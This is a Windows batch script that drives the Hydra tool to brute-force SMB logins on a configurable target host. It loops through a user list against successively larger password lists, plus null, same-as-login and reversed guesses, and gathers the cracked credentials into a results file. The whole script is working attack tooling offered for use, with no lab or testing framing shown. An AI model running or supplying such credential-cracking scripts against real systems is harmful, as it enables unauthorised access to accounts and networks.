
@echo off 

:: set these variables first before running the script 

::set "userlist=users.txt"
::set target=172.16.0.10
::set "domain=SECURE"

echo ""  > hydra_brute_cracked.txt

:: password 
Hydra-9\hydra.exe -L %userlist% -P pass_password.txt %target% smb > hydra_brute.txt
powershell "Get-Content .\hydra_brute.txt | findstr "\[smb\]" | sort-object| Get-Unique | Tee hydra_brute_cracked.txt"

:: pass5.txt
Hydra-9\hydra.exe -L %userlist% -P pass5.txt -e snr %target% smb >> hydra_brute.txt
powershell "Get-Content .\hydra_brute.txt | findstr "\[smb\]" | sort-object| Get-Unique | Tee hydra_brute_cracked.txt"

:: pass10.txt
Hydra-9\hydra.exe -L %userlist% -P pass10.txt %target% smb >> hydra_brute.txt
powershell "Get-Content .\hydra_brute.txt | findstr "\[smb\]" | sort-object| Get-Unique | Tee hydra_brute_cracked.txt"

:: pass100.txt
Hydra-9\hydra.exe -L %userlist% -P pass100.txt %target% smb >> hydra_brute.txt
powershell "Get-Content .\hydra_brute.txt | findstr "\[smb\]" | sort-object| Get-Unique | Tee hydra_brute_cracked.txt"


echo ""
echo ""
echo "################ FINISHED ################"
echo ""
type hydra_brute_cracked.txt